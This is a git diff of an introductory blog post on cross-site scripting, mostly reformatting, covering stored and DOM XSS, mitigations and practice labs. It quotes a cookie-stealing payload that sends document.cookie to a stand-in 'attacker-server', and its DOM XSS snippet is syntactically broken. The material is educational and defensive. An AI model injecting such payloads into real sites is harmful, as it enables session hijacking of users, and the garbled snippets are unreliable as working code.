@@ -2,6 +2,8 @@
 title: Cross-site Scripting - known as XSS
 date: 2021-06-01 18:28:16
 tags: [XSS, Cross-site Scripting, Web Security]
+banner_img: https://tva1.sinaimg.cn/large/0060lm7Tly1ftg6omusg9j31hc0u010h.jpg
+index_img: https://tva1.sinaimg.cn/large/0060lm7Tly1ftg6omusg9j31hc0u010h.jpg
 ---
 
 ## 1. Introduction
@@ -29,7 +31,9 @@ Cross-site scripting is an attack where some software applications take user's i
 2. The script below attempts to load an image from the attacker's server with the victim's cookie data within the request URL.
 
    ```html
-   <script>var+img=new+image();img.src='http://attacker-server/'+document.cookie;</script>
+   <script>
+     var+img=new+image();img.src='http://attacker-server/'+document.cookie;
+   </script>
    ```
 
 3. After a request for the image has taken place the attacker can extract the victim's session identifier from the webserver log files.
@@ -37,24 +41,26 @@ Cross-site scripting is an attack where some software applications take user's i
 
 ## 4. DOM XSS
 
-1. DOM stands for Document Object Model of the page. 
+1. DOM stands for Document Object Model of the page.
 
 2. The script below is an example. DOM based XSS where in attacker's payload is executed as a result of modifying the DOM 'environment' in the victims' browser used by the original client-side script so that the client side code runs in an unexpected manner.
 
-   ``` html
-   <script>document.write("<b>Current URL</b>" : " document.baseURL);</script>
+   ```html
+   <script>
+     document.write("<b>Current URL</b>" : " document.baseURL);
+   </script>
    ```
 
 ## 5. Mitigation of XSS
 
 ### Input validation
 
-- We can take parameter from URL or data from text and limit the user Input by using known blacklist. It is difficult to add because everyday hackers coming up with different Polyglots. 
+- We can take parameter from URL or data from text and limit the user Input by using known blacklist. It is difficult to add because everyday hackers coming up with different Polyglots.
 
-#### Output encoding 
+#### Output encoding
 
 - It is changing input so that it cannot be interpreted as code
-- Some HTML encoding rules: 
+- Some HTML encoding rules:
   - ", &, <, >
 - URL encoding/ percent encoding
 
@@ -67,7 +73,7 @@ Cross-site scripting is an attack where some software applications take user's i
 
 - set http-only via Set-Cookie HTTP response header
 
-## 6. Some site for learning CSS 
+## 6. Some site for learning CSS
 
 1. Google XSS Game
 2. DVWA
